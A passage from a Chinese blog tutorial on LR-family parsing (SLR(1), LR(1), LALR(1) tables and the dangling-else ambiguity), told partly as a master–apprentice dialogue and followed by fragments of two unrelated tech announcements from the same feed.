<p>如果某个项目集I={X→α·bβ, X→α·cβ, A→γ·, B→δ·}, 对于输入符号x有：</p>
<ol>
<li>
<p>若x∈{b,c},移进；</p>
</li>
<li>
<p>若x∈FOLLOW(A),则用产生式A→γ规约</p>
</li>
<li>
<p>若x∈FOLLOW(B),则用产生式B→δ规约</p>
</li>
<li>
<p>若x不在这三个集合中，则句子有错</p>
</li>
</ol>
<p>如果3个集合互有交集，则说明这种思路无法处理冲突，这个文法就不是SLR(1)文法。</p>
<p>相比于LR(0)，只要在有冲突的集合中，多计算一下归约项目中等待被归约的非终结符的Follow集合，只要和其他移入项目归约项目不冲突，那就完事了。</p>
<p>由于SLR(1)没有改变构建项目集规范族的方式，所以原来的LR(0)项目集规范族这个名字倒还可以继续用，就是那个LR(0)分析表得改名叫做SLR(1)分析表了。</p>
<p>毕竟，原来的LR(0)分析表最大的特点就是一旦到了某个需要归约的状态后，就不管三七二十一整行都填满rx。现在相当于更细化了，只有Follow(A)中的符号才需要填rx，其次就是根据移进项目在对应的格子中填写要跳转的项目。</p>
<h4 data-id="heading-11">5.3 细粒度的LR(1)</h4>
<p>比SLR(1)只在归约的时候只计算全局性的Follow(A)更进一步的，是LR(1)需要在每次归约的时候都得知道接下来跟着当前产生式的是什么符号，而这个信息是局部的。</p>
<p>比如，对于S'→S#, 谜底就在谜面上，只有当看到#，才能进行接受；</p>
<p>再比如，假如有第二条产生式S→Ab，那么假如要归约成S，就需要看到上一条表达式中S后面的符号，也就是#；</p>
<p>又比如，假如有第三条产生式A→a，那么根据前面一条产生式可知，这条A能归约的条件就是看到b。</p>
<p>要注意的是，尽管归约条件只有在归约的时候才会真正被用到，但由于要计算的信息是局部性的而不是像Follow那样的全局性，因此只有在计算LR(1)项目集规范族的时候把归约所需条件层层传递，才能让这些信息到达有需要的项中。</p>
<p>另外比较容易发现的是，即使这个产生式带了进度指示器，它的归约条件也不会变化。</p>
<p>后面为了规范化，将以类似“A→α·Bβ,a”的格式来表示某个项及其归约条件。其中逗号为间隔符。</p>
<p>我已想到一种类似于DFA探索地图一样绝妙而简便的方法，从而不混乱地进行LR(1)项目族规范族的构建。所幸这里有大把空间，可以用如下已拓广文法为例进行说明：</p>
<p>(习题4)</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">0.</span> S′→S$ 
<span class="hljs-bullet">1.</span> S→BB 
<span class="hljs-bullet">2.</span> B→aB 
<span class="hljs-bullet">3.</span> B→b
</code></pre>
<p>首先为开始符号S'产生式生成带归约条件的项目：S′→·S, $。（这么说来S后面还真加不加#都没所谓，反正知道S'就是收到S看到句子结束符就acc就好。）</p>
<p>生成一个有四列的表格，如下所示。其中，第一行数据填上：状态名称：0；来源：空；初始项：S'→·S,<span class="math math-inline"><span class="katex-error" title="ParseError: KaTeX parse error: Expected '}', got 'EOF' at end of input: …子程序所增加项：{S→·BB," style="color:#cc0000"><span class="cjk_fallback">，以及求子程序所增加项：{S→·BB,</span></span></span>；B→·aB, a/b；B→·b, a/b}。</p>
<p>在初始条件准备妥当后，就开始循环：</p>
<p>每一轮中，对当前表格中还没被完全处理完毕的状态，找出它里面还没被处理的项，然后对这个项施加可以让它的进度发生变化的激励，如S、B等，从而产生新临时状态的初始项。如果这个初始项从未出现过，则确认为发现了新状态，记录在表格新的一列中。同时还可以在这个已处理的项后面标记接下来会进行的相应操作标记，从而防止重复处理该项，并方便后续LR(1)分析表的构建。</p>
<p>重复上述过程，直到没有新状态产生，所得项目集即为LR(1)项目集规范族。</p>
<p>状态名称</p>
<p>上一个状态(来源)</p>
<p>初始项</p>
<p>求子程序所增加项</p>
<p>0</p>
<p>S'→·S,$，1</p>
<p>S→·BB,$，2<br/>
B→·aB, a/b，3<br/>
B→·b, a/b，4</p>
<p>1</p>
<p>0</p>
<p>I1: S'→S·, $，acc</p>
<p>2</p>
<p>0</p>
<p>S→B·B,$，5</p>
<p>B→·aB, <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">，6  
B→·b, </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">，</span><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span></span></span></span></span>，7</p>
<p>3</p>
<p>0, 3</p>
<p>B→a·B, a/b，8</p>
<p>B→·aB, a/b，3<br/>
B→·b, a/b，4</p>
<p>4</p>
<p>0, 3</p>
<p>B→b·,a/b，r3</p>
<p>5</p>
<p>2</p>
<p>S→BB·, $，r1</p>
<p>6</p>
<p>2, 6</p>
<p>B→a·B,$，8</p>
<p>B→·aB,<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">，6  
B→·b,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">，</span><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span></span></span></span></span>，7</p>
<p>7</p>
<p>2, 6</p>
<p>B→b·,$，r3</p>
<p>8</p>
<p>3</p>
<p>B→aB·,a/b，r2</p>
<p>9</p>
<p>6</p>
<p>B→aB·,$，r2</p>
<p>接下来就可以构建相应的LR(1)分析表了</p>
<p>a</p>
<p>b</p>
<p>$</p>
<p>S</p>
<p>B</p>
<p>0</p>
<p>3</p>
<p>4</p>
<p>1</p>
<p>2</p>
<p>1</p>
<p>acc</p>
<p>2</p>
<p>6</p>
<p>7</p>
<p>5</p>
<p>3</p>
<p>3</p>
<p>4</p>
<p>8</p>
<p>4</p>
<p>r3</p>
<p>r3</p>
<p>5</p>
<p>r1</p>
<p>6</p>
<p>6</p>
<p>7</p>
<p>8</p>
<p>7</p>
<p>r3</p>
<p>8</p>
<p>r2</p>
<p>r2</p>
<p>9</p>
<p>r2</p>
<h4 data-id="heading-12">5.4 LALR(1): LR(1)的成本优化方案</h4>
<p>我去，终于写完这10个状态了，LR(1)分析实在是太繁琐了，这工作是给人类做的吗？？要不是非要写文档，这工作机器做绝对比人强啊！</p>
<p>而且话说回来，上面这个文法中的状态4和7，状态8和9，以及状态3和6，他们除了归约条件不同以外所有项都一样的呀。这相比于LR(0)的项目集规范族，完全就是脱裤子放屁啊。</p>
<p>既然前面都试过用奥卡姆剃刀来化简状态，那LR(1)的状态估计也是可以被美容一下的。</p>
<p>状态名称</p>
<p>上一个状态(来源)</p>
<p>初始项</p>
<p>求子程序所增加项</p>
<p>0</p>
<p>S'→·S,$，1</p>
<p>S→·BB,<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>2</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>a</mi><mi>B</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">，2  
B→·aB, a/b/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">，</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span><span class="mord">/</span></span></span></span></span>，3,6<br/>
B→·b, a/b/$，4,7</p>
<p>1</p>
<p>0</p>
<p>I1: S'→S·, $，acc</p>
<p>2</p>
<p>0</p>
<p>S→B·B,$，5</p>
<p>B→·aB, a/b/<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>3</mn><mo separator="true">,</mo><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">，3,6  
B→·b, a/b/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord cjk_fallback">，</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span><span class="mord">/</span></span></span></span></span>，4,7</p>
<p>3,6</p>
<p>0, 3</p>
<p>B→a·B, a/b/$，8</p>
<p>B→·aB, a/b/<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>3</mn><mo separator="true">,</mo><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">，3,6  
B→·b, a/b/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord cjk_fallback">，</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span><span class="mord">/</span></span></span></span></span>，4,7</p>
<p>4,7</p>
<p>0, 3</p>
<p>B→b·,a/b/$，r3</p>
<p>5</p>
<p>2</p>
<p>S→BB·, $，r1</p>
<p>8,9</p>
<p>3</p>
<p>B→aB·,a/b/$，r2</p>
<p>对应的分析表：</p>
<p>a</p>
<p>b</p>
<p>$</p>
<p>S</p>
<p>B</p>
<p>0</p>
<p>3,6</p>
<p>4,7</p>
<p>1</p>
<p>2</p>
<p>1</p>
<p>acc</p>
<p>2</p>
<p>3,6</p>
<p>4,7</p>
<p>5</p>
<p>3,6</p>
<p>3,6</p>
<p>4,7</p>
<p>8,9</p>
<p>4,7</p>
<p>r3</p>
<p>r3</p>
<p>r3</p>
<p>5</p>
<p>r1</p>
<p>8,9</p>
<p>r2</p>
<p>r2</p>
<p>r2</p>
<p>合并后没有任何冲突发生，说明这个方法是work的，状态得到了削减！</p>
<p>命个什么名好呢。。这个算法合并了LR(1)中内核相同的状态，那干脆就叫LA（kerneL Aggregation）LR(1)吧！</p>
<p>……</p>
<p>师傅看完递交上来的三个算法方案，随口吐槽道：“前面两个暂且不说，光看你这LALR(1)，我还以为是Look-Ahead LR(1)呢，不过想想那个1已经是向前看一个符号的意思了，想必你也不会脱裤子放屁多讲一遍。</p>
<p>另外我感觉你这LALR(1)虽说是少了状态了，但是它解决冲突的能力应该是要差过LR(1)?”</p>
<p>嗯是的，在极端情况下如果LR(1)原来的状态中如果有如下两个状态：</p>
<ul>
<li>
<p>状态 1：</p>
</li>
<li>
<p>A-&gt;α·，{a}</p>
</li>
<li>
<p>B-&gt;β·，{b}</p>
</li>
<li>
<p>状态 2：</p>
</li>
<li>
<p>A-&gt;α·，{b}</p>
</li>
<li>
<p>B-&gt;β·，{a//其实这里是啥已经不重要了}</p>
</li>
</ul>
<p>这样合并之后A-&gt;α·的归约条件集合就一定会和B-&gt;β·的有非空交集，归约-归约的纷争就开始了。</p>
<p>相反，合并内核是绝对不会产生移进-归约冲突的。</p>
<p>原因在于：要产生移进归约项目，说明这个状态内部本来就要有移进项目。合并状态之后，也只是把它们的归约条件合并了。只要原来没有冲突，那么说明这个移进项目等待移进的符号与原始状态的归约项目的条件不会冲突，所以合并后也绝对不会冲突。</p>
<p>一旦合并后有冲突产生的, 就不叫LALR(1)文法；</p>
<p>只有合并后没有出现冲突的，才叫LALR(1)文法。</p>
<p>他们四兄弟按能力排序应为：LR(1)⊇LALR(1) ⊇ SLR(1) ⊇ LR(0)</p>
<p>师傅心中os：“为啥用包含号不用大于号来着？啊对，这是四大类文法，是四个集合，比大小得用包含符号。”</p>
<h3 data-id="heading-13">6. 二义性及其处理</h3>
<p>既然自顶向下语法分析、自底向上语法分析都开发完成了，两人目光便又落在那个一切的开端，if else文法。似乎只要解决这一切，客户的其他问题便都能迎刃而解。</p>
<p>(习题5)</p>
<p>S→if B S | if B S else S</p>
<p>给出句型if B if B S else S的语法树。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06f78d386df341198ada825741a18196~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=YNIeQ84n1NrTOXfE4oBYtIi%2B2Pk%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/933de6295f1b4584836baa524f06b24f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=8qcK6IRdT8lxHUZ2jWDkz%2Bs%2FvH0%3D" alt="" loading="lazy"/></p>
<p>啊，这，都不是LR(1)文法，分析个屁╮(￣▽￣)╭，连这么简单的文法都搞不定，搞了这么久白忙活了。果然这语法写得太过简单就是在为难我胖虎编译器。要是写成if end或者end if这样的形式就容易分析多了。</p>
<p>师傅：“哈哈毕竟编译器的工作就是为人类服务嘛。等一下，我感觉倒也不用灰心，我发现他的LR(0)分析表还挺有意思的。你看，歧义就只出现在(4,'else')这个格子里。</p>
<p>if</p>
<p>B</p>
<p>S</p>
<p>else</p>
<h2 data-id="heading-14"/>
<p>0</p>
<p>2</p>
<p>1</p>
<p>1</p>
<p>acc</p>
<p>2</p>
<p>3</p>
<p>3</p>
<p>2</p>
<p>4</p>
<p>4</p>
<p>5,r1</p>
<p>r1</p>
<p>5</p>
<p>2</p>
<p>6</p>
<p>6</p>
<p>r2</p>
<p>r2</p>
<p>你之前的LR系列文法出现冲突其实都是同样的问题对吧？那时候都觉得无法处理是因为我们不知道什么时候该走那条路，因为文法太抽象了。但对于if else，咱们可以引入一些规则来辅助判断呀！</p>
<p>比如，可以要求写代码的人记住‘if只跟最近的else匹配’。一旦加上这条规则，意味着只要if看到后面有else，就决不会自绝于代码中，这样咱们直接就把这个格子中的r1去掉就好啦。别愣着了，规则是人定的，树挪死人挪活。“</p>
<p>师傅我突然想起九品芝麻官中那个歧义梗：”年租银两三十万不能转租别人“不是有两种解读方式嘛？现在看到这个语法树我才明白，这所谓文法的歧义就是指文法本身有问题，会导致一句话可以对应多棵语法树！</p>
<p>师傅点点头：“你这么一说，之前正则文法说是对应正则语言。那文法对应的也应该是语言。如果文法会导致歧义，那我估计有些语言天生就是带有歧义的，无论你用什么文法去描述都有歧义。</p>
<p>关键是，我感觉这歧义最麻烦的是没有通用算法直接判定，唯一能做的就是反证法，直接举个反例，说这里有个句子有多个语法树，然后这个文法就是带歧义了。</p>
<p>不管怎么说，咱们也算是把if else这个Boss给解决了！”</p>
<h3 data-id="heading-15">7.和LL文法的对比</h3>
<p>“所以，你们搞出来的这个LR分析，到底比前面的LL强在了哪里？”老板还是有点没搞懂。</p>
<p>简单来讲，LL(k)即使k很大很大，那也是一个有限值。也就是说，它的目光是有限的。而LR分析技术，它就像个闷骚怪，先不声不响吸收了一大堆知识，等到他觉得可以做决定的时候再进行消化。这样他就具有了后手优势，总是会比先手的LL类要少出错。也就是说，它们的能力并不等价。</p>
<p>“但你说的这个出错我觉得核心在于你限制了它不能犯错吧？只要我允许它犯错并回溯，这样的话两者应该是完全等价的才对。”</p>
<p>您说得挺有道理，如果允许无限回溯，那么它们对上下文无关语言的识别上确实是等价的。经您这一提醒，我感觉LR有一个问题就是全部转成状态之后，代码太抽象太难调试了。如果可以让LL分析真的像DFS那样自顶向下一层一层递归解析，感觉写起来也不复杂呐。虽然说可能又让代码与逻辑灵肉纠缠了，但只要语言没有变态性的发育，这么点小修补应该还是能接受的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025·xLLM开源项目年度总结]]></title>    <link>https://juejin.cn/post/7605625595570487311</link>    <guid>https://juejin.cn/post/7605625595570487311</guid>    <pubDate>2026-02-13T02:29:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570487311" data-draft-id="7605542907118878772" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025·xLLM开源项目年度总结"/> <meta itemprop="keywords" content="开源"/> <meta itemprop="datePublished" content="2026-02-13T02:29:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东零售技术"/> <meta itemprop="url" content="https://juejin.cn/user/4233576972293643"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025·xLLM开源项目年度总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4233576972293643/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东零售技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:29:03.000Z" title="Fri Feb 13 2026 02:29:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>xLLM 实现 Day0 支持智谱 GLM-5 大模型，深度优化华为昇腾推理性能。用户即日起可在 xLLM 中直接体验 GLM-5 的卓越性能，尤其针对华为昇腾平台完成了深度推理优化，推理效率显著提升。这是 xLLM 在国产芯片适配领域迈出的又一关键步伐。</p>
<p>回望2025年8月开源以来，xLLM 已全面完成对昇腾、寒武纪、摩尔线程、天数智芯等主流国产芯片的深度适配与优化，覆盖大语言模型、多模态、文生图及生成式推荐等核心AI场景，并在关键模型上取得高吞吐、低延迟的性能突破。通过与头部模型厂商的深度协同，我们实现从通用大模型到专业领域模型的快速支持，持续降低国产AI落地的门槛。</p>
<p>迈向2026，xLLM 期待与各位继续携手，共同推动开源 AI Infra 生态的繁荣与发展。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/059c61309a9845b0b06466ec9d82e72d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554542&amp;x-signature=sAfEKZlG6mj6h1tDXTQJu7yX4LM%3D" alt="2.12.jpg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[百度文心快码全面支持GLM-5]]></title>    <link>https://juejin.cn/post/7605542907118944308</link>    <guid>https://juejin.cn/post/7605542907118944308</guid>    <pubDate>2026-02-13T02:42:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605542907118944308" data-draft-id="7605772919224533026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="百度文心快码全面支持GLM-5"/> <meta itemprop="keywords" content="前端,人工智能"/> <meta itemprop="datePublished" content="2026-02-13T02:42:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="文心快码BaiduComate"/> <meta itemprop="url" content="https://juejin.cn/user/992209294070809"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            百度文心快码全面支持GLM-5
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/992209294070809/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    文心快码BaiduComate
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:42:35.000Z" title="Fri Feb 13 2026 02:42:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
